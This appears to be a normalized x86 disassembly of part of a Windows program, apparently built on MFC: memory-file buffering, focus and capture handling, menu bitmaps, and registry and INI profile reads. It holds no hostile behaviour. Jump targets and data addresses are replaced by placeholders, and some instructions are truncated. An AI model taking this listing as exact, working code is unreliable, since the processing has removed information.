jg r-xdata
movsx eax al
sub eax 0x31
cmp [ esi ] 0x0
je r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x39
jle r-xdata
inc ebx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov [ edi ] 0x3f
inc edi
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
add ebx eax
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
push eax
push edi
call [ lstrcpyA@IAT ]
push edi
call [ lstrlenA@IAT ]
add edi eax
jmp r-xdata
inc edi
inc edi
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc esi
inc esi
cmp eax [ ebp + 0x14 ]
jl r-xdata
sub_425cc4
push ecx
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] ecx
call [ GetCapture@IAT ]
mov esi [ SendMessageA@IAT ]
mov edi eax
xor ebp ebp
mov ebx 0x365
cmp edi ebp
je r-xdata
call [ GetFocus@IAT ]
push ebp
push ebp
push ebx
push edi
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
call sub_42089b
cmp eax ebp
jne r-xdata
push ebp
push ebp
push ebx
push edi
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
call sub_420856
mov edi eax
cmp edi ebp
jne r-xdata
mov eax [ eax + 0x1c ]
xor eax eax
jmp r-xdata
push edi
call sub_420856
jmp r-xdata
mov eax [ esp + 0x14 ]
push 0xe147
push 0x111
push [ eax + 0x1c ]
call esi
push ebp
push ebx
push edi
call esi
test eax eax
jne r-xdata
push eax
call [ GetLastActivePopup@IAT ]
mov edi eax
cmp edi ebp
je r-xdata
push edi
call sub_420856
jmp r-xdata
mov edi eax
push ebp
cmp edi ebp
je r-xdata
sub_425d66
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov ecx esi
call sub_425cc4
cmp eax 0x3f107
je r-xdata
pop esi
retn
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x1
push [ esi + 0x4c ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x98 ]
pop esi
retn
sub_425db5
push esi
mov esi ecx
call sub_423942
mov eax [ esp + 0x10 ]
and [ esi + 0x14 ] 0x0
mov ecx [ esp + 0xc ]
mov [ esi + 0x10 ] eax
neg eax
sbb eax eax
and [ esi + 0x24 ] 0x0
not eax
and eax ecx
mov [ esi ] r--data
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x18 ] ecx
mov eax esi
pop esi
retn 0xc
sub_425df1
mov eax sub_42b324
call sub_410a78
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
cmp [ esi + 0x20 ] edi
mov [ ebp - 0x4 ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call sub_423997
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
call sub_425fd8
sub_425e5c
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov eax ecx
mov edx edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn 0xc
sub_425e92
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x18 ]
cmp ebx edi
jbe r-xdata
pop edi
pop esi
pop ebx
retn 0x4
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp edi ebx
jae r-xdata
call sub_41dc26
mov eax [ esi + 0x20 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x10 ]
mov edx [ esi ]
push edi
push eax
mov ecx esi
call [ edx + 0x58 ]
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x54 ]
jmp r-xdata
add edi eax
cmp edi ebx
jb r-xdata
mov [ esi + 0x20 ] ebx
mov [ esi + 0x18 ] edi
call sub_41dc26
mov ebx eax
test ebx ebx
jne r-xdata
sub_425eeb
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x18 ]
jbe r-xdata
cmp edi [ esi + 0x14 ]
jae r-xdata
mov eax [ esi ]
push edi
call [ eax + 0x64 ]
mov [ esi + 0x1c ] edi
pop edi
pop esi
retn 0x4
mov [ esi + 0x14 ] edi
sub_425f0e
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi + 0x1c ]
cmp ecx eax
jbe r-xdata
pop edi
pop esi
retn 0x8
lea edx [ ecx + edi ]
cmp edx eax
jbe r-xdata
mov edx [ esi + 0x20 ]
mov eax [ esi ]
add edx ecx
push edi
push edx
mov ecx esi
push [ esp + 0x14 ]
call [ eax + 0x5c ]
add [ esi + 0x14 ] edi
mov eax edi
sub eax ecx
mov edi eax
sub_425f4f
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov eax [ esi + 0x14 ]
add eax edi
cmp eax [ esi + 0x18 ]
jbe r-xdata
mov ecx [ esi + 0x20 ]
mov eax [ esi ]
add ecx [ esi + 0x14 ]
push edi
push [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
add [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0x1c ]
jbe r-xdata
mov edx [ esi ]
push eax
call [ edx + 0x64 ]
mov [ esi + 0x1c ] eax
sub_425f91
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push esi
push edi
mov edi ecx
mov esi [ edi + 0x14 ]
jne r-xdata
cmp [ ebp + 0xc ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
add esi [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x2
jne r-xdata
test esi esi
jge r-xdata
mov [ edi + 0x14 ] esi
mov eax esi
jmp r-xdata
push 0x0
push 0xffffffff
push 0x9
call sub_42423a
or eax 0xffffffff
mov esi [ edi + 0x1c ]
pop edi
pop esi
pop ebp
retn 0x8
sub_425fd8
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x20 ]
mov [ esi + 0x10 ] edi
cmp eax edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
je r-xdata
mov [ esi + 0x20 ] edi
pop edi
pop esi
retn
cmp [ esi + 0x24 ] edi
je r-xdata
mov edx [ esi ]
push eax
call [ edx + 0x60 ]
sub_426017
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
cmp ebx 0x3
mov esi ecx
jne r-xdata
cmp ebx 0x2
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp ebx 0x1
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi + 0x14 ] eax
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0x1c ]
jbe r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0x10 ]
add eax [ esi + 0x20 ]
cmp ebx 0x1
mov [ edx ] eax
jne r-xdata
mov eax [ esi + 0x14 ]
add eax edi
cmp eax [ esi + 0x18 ]
jbe r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x1c ] eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x18 ]
add eax edi
cmp ecx eax
jae r-xdata
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x64 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x1c ]
add eax edi
cmp ecx eax
jae r-xdata
mov edi [ esi + 0x18 ]
sub edi [ esi + 0x14 ]
add eax [ esi + 0x20 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov eax ecx
mov ecx [ esi + 0x20 ]
add eax ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
sub eax [ edx ]
add [ esi + 0x14 ] eax
mov eax ecx
mov eax [ ecx ]
pop edi
sub eax [ edx ]
sub_4260be
mov eax sub_42ab34
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41fc17
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41fa5a
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4260f9
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x2b
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xb8 ]
push 0x1
pop eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420b6a
jmp r-xdata
pop ebp
retn 0x10
sub_426127
mov eax sub_42ab48
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41fc17
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41fa5a
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_426164
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x2b
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xb8 ]
dec eax
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xbc ]
jmp r-xdata
dec eax
je r-xdata
push 0x1
pop eax
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xc4 ]
jmp r-xdata
sub eax 0xc
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xc0 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420b6a
jmp r-xdata
pop ebp
retn 0x10
sub_426205
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ rw-data ]
push [ esi + 0x8 ]
call [ GetMapMode@IAT ]
mov edi eax
cmp edi 0x7
jge r-xdata
mov edi [ GetDeviceCaps@IAT ]
push 0x58
push [ esi + 0x8 ]
call edi
push 0x5a
mov ebx eax
push [ esi + 0x8 ]
call edi
jmp r-xdata
cmp edi 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
push ebx
mov ebx 0x9ec
push ebx
mov [ ebp - 0x4 ] eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
push ebx
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x3
mov ecx esi
call [ eax + 0x34 ]
push [ ebp + 0x8 ]
mov ecx esi
call sub_424af5
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_426293
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push [ esi + 0x8 ]
call [ GetMapMode@IAT ]
mov edi eax
cmp edi 0x7
jge r-xdata
mov ebx [ GetDeviceCaps@IAT ]
push 0x58
push [ esi + 0x8 ]
call ebx
push 0x5a
mov edi eax
push [ esi + 0x8 ]
call ebx
jmp r-xdata
cmp edi 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov ebx 0x9ec
push ebx
push edi
push [ esi ]
mov edi [ MulDiv@IAT ]
mov [ ebp - 0x4 ] eax
call edi
push ebx
mov [ esi ] eax
push [ ebp - 0x4 ]
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x3
mov ecx esi
call [ eax + 0x34 ]
push [ ebp + 0x8 ]
mov ecx esi
call sub_424a8c
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_426349
push esi
mov esi [ GetVersion@IAT ]
push edi
call esi
mov edi 0x80000000
test edi eax
je r-xdata
call esi
test edi eax
jne r-xdata
call esi
cmp ax 0x4
je r-xdata
and [ rw-data ] 0x0
call esi
cmp ax 0x3
jne r-xdata
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
retn
sub_426394
mov eax sub_42aae5
call sub_410a78
push ecx
push 0x3c
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_41efc6
sub_4263cc
mov eax sub_42aafa
call sub_410a78
push ecx
push esi
mov ecx rw-data
call sub_409640
mov esi eax
mov [ ebp - 0x10 ] esi
xor eax eax
cmp esi eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx esi
call sub_41efc6
mov [ esi ] r--data
mov eax esi
sub_426477
mov eax sub_42ab0d
call sub_410a78
push ecx
push 0x118
call sub_42747a
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_42701f
sub_4264ab
mov eax sub_42ab21
call sub_410a78
push ecx
push 0x10
call sub_42747a
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_4266b2
sub_426518
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
movsx ecx ax
cmp ebx 0x20
mov [ ebp - 0xc ] ecx
jle r-xdata
lea eax [ ebx - 0x4 ]
lea esi [ ebx + 0xf ]
cdq
sub eax edx
sar esi 0x4
mov edi eax
mov eax esi
sar edi 0x1
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x90 ]
push 0xff
push eax
call sub_410a20
mov eax [ ebp - 0xc ]
add esp 0xc
add eax 0xfffffffa
mov [ ebp - 0x4 ] r--data
sar eax 0x1
imul eax esi
add esi esi
mov [ ebp - 0x8 ] 0x5
lea edx [ ebp + eax * 2 - 0x90 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx edi
movzx ax [ eax ]
shl eax cl
inc [ ebp - 0x4 ]
xor ecx ecx
not eax
mov cl ah
mov [ edx + 0x1 ] al
mov [ edx ] cl
add edx esi
dec [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x1
push [ ebp - 0xc ]
push ebx
call [ CreateBitmap@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebx
jne r-xdata
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_426621
push esi
mov ecx rw-data
call sub_409640
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_41df4a
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4266d6
mov eax sub_42abec
call sub_410a78
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_426a30
xor edi edi
mov [ esi ] r--data
cmp [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov [ esi + 0x78 ] edi
push [ ebp + 0x8 ]
call sub_4113d9
pop ecx
mov [ esi + 0x78 ] eax
jmp r-xdata
call sub_4272f7
mov ebx eax
push sub_4269e3
lea ecx [ ebx + 0x1070 ]
call sub_4278ac
mov [ eax + 0x4 ] esi
call [ GetCurrentThread@IAT ]
mov [ esi + 0x28 ] eax
call [ GetCurrentThreadId@IAT ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x2c ] eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x68 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x7c ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0xb2 ] di
mov [ esi + 0xb0 ] di
mov [ esi + 0x70 ] edi
mov [ esi + 0xac ] edi
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov [ esi + 0xb4 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0xb8 ] 0x200
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4267dc
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0x80 ] 0x0
lea eax [ ecx + 0x80 ]
jne r-xdata
and [ rw-data ] 0x0
mov eax [ ecx ]
push 0x0
call [ eax + 0xc ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ eax ] edx
push 0x1
pop eax
retn
sub_426820
mov eax sub_42ac00
call sub_410a78
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x80 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ esi + 0xa8 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
call sub_4272f7
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
mov eax [ esi + 0x94 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x98 ]
cmp eax ebx
je r-xdata
push eax
call sub_425000
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ rw-data ] ebx
mov ax [ esi + 0xb0 ]
push edi
mov edi [ GlobalDeleteAtom@IAT ]
cmp ax bx
je r-xdata
push eax
call sub_425000
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ rw-data ] ebx
mov ax [ esi + 0xb2 ]
cmp ax bx
je r-xdata
push eax
call edi
mov ecx [ esi + 0xac ]
pop edi
cmp ecx ebx
je r-xdata
push eax
call edi
call sub_4272f7
mov ecx [ eax + 0x10 ]
cmp ecx [ esi + 0x78 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp [ eax + 0x4 ] esi
jne r-xdata
mov [ eax + 0x10 ] ebx
push [ esi + 0x78 ]
call sub_410cc6
push [ esi + 0x7c ]
call sub_410cc6
push [ esi + 0x88 ]
call sub_410cc6
push [ esi + 0x8c ]
call sub_410cc6
push [ esi + 0x90 ]
call sub_410cc6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x14
mov ecx esi
mov [ esi + 0x28 ] ebx
call sub_429ce8
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov [ eax + 0x4 ] ebx
sub_426956
push esi
mov esi ecx
mov ecx [ esi + 0xa8 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
pop esi
retn
push eax
push r--data
push r--data
mov ecx esi
call sub_425a5f
sub_426986
push esi
mov esi ecx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
call sub_4272f7
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x10 ] 0x5
je r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
mov ecx esi
call sub_426956
mov eax [ esi + 0x38 ]
pop esi
retn
call eax
sub_4269e3
mov eax sub_42ac15
call sub_410a78
push ecx
push 0x3c
call sub_42747a
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_4271ee
sub_426a30
mov eax sub_42ac3c
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_421ce9
xor eax eax
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
call sub_426a6d
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_426a6d
push esi
mov esi ecx
push edi
xor edi edi
lea eax [ esi + 0x5c ]
mov [ esi + 0x1c ] edi
push eax
mov [ esi + 0x20 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x64 ] edi
call [ GetCursorPos@IAT ]
mov [ esi + 0x58 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x24 ] 0x1
pop edi
pop esi
retn
sub_426ba0
push esi
mov ecx rw-data
call sub_409640
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_4245ac
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_426cdc
push esi
mov esi ecx
push edi
push [ esi + 0x7c ]
call sub_410cc6
push [ esp + 0x10 ]
call sub_4113d9
push [ esi + 0x90 ]
lea edi [ esi + 0x90 ]
mov [ esi + 0x7c ] eax
call sub_410cc6
push [ esi + 0x78 ]
call sub_4113d9
add esp 0x10
mov [ edi ] eax
pop edi
pop esi
retn 0x4
sub_426d17
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
mov esi 0x2001f
xor edi edi
push eax
push esi
push edi
mov ebx ecx
push r--data
push 0x80000001
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] edi
mov esi [ RegCloseKey@IAT ]
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push esi
push edi
push edi
push edi
push [ ebx + 0x7c ]
mov ebx [ RegCreateKeyExA@IAT ]
push [ ebp - 0x4 ]
call ebx
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push edi
push esi
push edi
push edi
push edi
push [ eax + 0x90 ]
push [ ebp - 0x8 ]
call ebx
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
call esi
sub_426dab
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
push edi
mov [ ebp - 0x4 ] esi
call sub_426d17
mov edi eax
cmp edi esi
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x2001f
push esi
push esi
push esi
push [ ebp + 0x8 ]
push edi
call [ RegCreateKeyExA@IAT ]
push edi
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
sub_426df1
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ecx + 0x7c ] 0x0
push esi
je r-xdata
push [ ecx + 0x90 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetPrivateProfileIntA@IAT ]
push [ ebp + 0x8 ]
call sub_426dab
mov esi eax
test esi esi
jne r-xdata
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push [ ebp + 0xc ]
mov [ ebp + 0x8 ] 0x4
push esi
call [ RegQueryValueExA@IAT ]
push esi
mov edi eax
call [ RegCloseKey@IAT ]
test edi edi
pop edi
jne r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
pop esi
leave
retn 0xc
sub_426e5d
mov eax sub_42ad2c
call sub_410a78
mov eax 0x100c
call sub_411530
push edi
xor edi edi
cmp [ ecx + 0x7c ] edi
mov [ ebp - 0x14 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
push [ ebp + 0xc ]
call sub_426dab
cmp eax edi
mov [ ebp - 0x10 ] eax
jne r-xdata
push [ ecx + 0x90 ]
lea eax [ ebp - 0x1018 ]
push 0x1000
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetPrivateProfileStringA@IAT ]
lea eax [ ebp - 0x1018 ]
push eax
mov [ ebp + 0x14 ] rw-data
mov ecx [ rw-data ]
push ebx
push esi
mov [ ebp + 0xc ] ecx
lea ecx [ ebp - 0x18 ]
mov esi [ RegQueryValueExA@IAT ]
push ecx
lea ecx [ ebp - 0x14 ]
push edi
push ecx
push edi
mov [ ebp - 0x4 ] edi
push [ ebp + 0x10 ]
push eax
call esi
mov ebx eax
cmp ebx edi
jne r-xdata
push [ ebp + 0x14 ]
jmp r-xdata
push [ ebp - 0x10 ]
call [ RegCloseKey@IAT ]
pop esi
cmp ebx edi
pop ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0xc ]
push eax
push [ ebp - 0x18 ]
call sub_422745
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp + 0x10 ]
push [ ebp - 0x10 ]
call esi
push 0xffffffff
lea ecx [ ebp + 0xc ]
mov ebx eax
call sub_422794
mov ecx [ ebp + 0x8 ]
call sub_4224e6
push [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
call sub_4224e6
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_4221ed
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call sub_422478
jmp r-xdata
sub_426f6e
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
je r-xdata
push sub_4264dc
mov ecx rw-data
call sub_427941
mov esi eax
cmp [ esi + 0x4 ] edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov [ esi + 0xc ] sub_41a520
mov [ esi + 0x10 ] sub_41a590
mov [ esi + 0x14 ] sub_41a650
mov [ esi + 0x18 ] sub_41a7d0
mov [ esi + 0x1c ] sub_41ac70
mov [ esi + 0x20 ] sub_41ab70
mov [ esi + 0x24 ] sub_41af50
mov [ esi + 0x28 ] sub_41a870
mov [ esi + 0x2c ] sub_41a9b0
call sub_4272f7
push [ eax + 0x8 ]
call [ esi + 0xc ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
call sub_4272f7
push [ eax + 0x8 ]
call [ esi + 0x14 ]
xor eax eax
jmp r-xdata
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
sub_427051
mov eax sub_42ad90
call sub_410a78
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0xcc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_410cc6
pop ecx
sub_4270fb
mov eax ecx
xor edx edx
